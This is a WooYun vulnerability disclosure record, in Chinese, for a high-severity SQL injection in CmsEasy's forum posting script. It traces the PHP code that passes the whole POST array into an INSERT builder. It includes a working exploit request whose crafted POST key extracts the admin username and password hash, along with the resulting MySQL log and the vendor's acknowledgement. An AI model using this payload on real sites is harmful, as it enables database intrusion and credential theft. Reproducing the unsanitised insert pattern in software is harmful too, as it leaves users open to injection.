{"id": 1185, "wybug_id": "wooyun-2014-066221", "wybug_title": "Cmseasy SQL注射漏洞之三", "wybug_corp": "cmseasy", "wybug_author": "Noxxx", "wybug_date": "2014-06-25 23:33", "wybug_open_date": "2014-09-23 23:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向公众公开  简要描述： 注入。。 详细说明：  bbs中发文章的时候 直接把$_POST数据带入 拼接sql功能函数中导致注入/bbs/add-archive.php  30行\nif($id = $archive->inserData($_POST)){\n 直接带入整个$_POST/bbs/model/db/base.php  38行\npublic function inserData($data){       $r = $this->odb->insert($this->tblName,$data); //在跟入       if($r)           return $this->odb->getInsertId();       else           return false;}\n/bbs/commonlib/db.php\npublic function insert($table, $data)\t{\t\t$sql = $this->getInsertString($table, $data);//拼接sql 继续看。。\t\t   \t\treturn $this->execSql($sql);\t}\n\npublic function getInsertString($table, $data)\t{\t\t$n_str = '';\t\t$v_str = '';\t\t$table = $this->filterString($table);\t\tforeach ($data as $k => $v)//遍历数据  因为穿过来的是整个$_POST所以 我们可以任意控制 列明和值\t\t{\t\t\t$n_str .= $this->filterString($k).',';\t\t\t$v_str .= \"'\".$this->filterString($v).\"',\";\t\t}\t\t\t\t\t$n_str = preg_replace( \"/,$/\", \"\", $n_str );\t\t$v_str = preg_replace( \"/,$/\", \"\", $v_str );\t\t$str = 'INSERT INTO '.$table.' ('.$n_str.') VALUES('.$v_str.')';\t\treturn $str;\t}\n\npublic function filterString($str)\t{\t\t\tif ($this->magic_quotes)\t\t{\t\t\t$str = stripslashes($str);\t\t}\t\t\t\tif ( is_numeric($str) ) {\t\t\treturn $str;\t\t} else {\t\t\t$ret = @mysqli_real_escape_string($this->con, $str);\t\t\tif ( strlen($str) && !isset($ret) ) {\t\t\t\t$r = $this->checkConnection();\t\t\t\tif ($r !== true) {\t\t\t\t\t$this->closeDB();\t\t\t\t\t$ret = $str;\t\t\t\t}\t\t\t}\t\t\treturn $ret;\t\t}\t}\n过滤也没什么用 因为没过滤关键一些语句里面还有一个360safe.php的脚本 但是 这个并不过滤键名 只过滤键值还有一个变量名中的点和空格被转换成下划线。不过不用空格也是可以的。。exp:http://127.0.0.1/PHP/CmsEasy/bbs/add-archive.php?cid=1(POST)title=a&content)values(1,(SELECT(CONCAT(USERNAME,0x7c,PASSWORD))FROM(cmseasy_user)WHERE(USERID%3D1)))#=c&submit=a&verify=HKCX   漏洞证明：  mysql 日志 ： 2070 Query\tINSERT INTO cmseasy_bbs_archive (title,content)values(1,(SELECT(CONCAT(USERNAME,0x7c,PASSWORD))FROM(cmseasy_user)WHERE(USERID=1)))#,username,userid,ip,addtime) VALUES('a','c','123213','4','127.0.0.1','1403698291')\n\n\n\n   修复方案：  不要把$_POST提交过去。。   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-26 12:26 厂商回复： 感谢，马上修正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}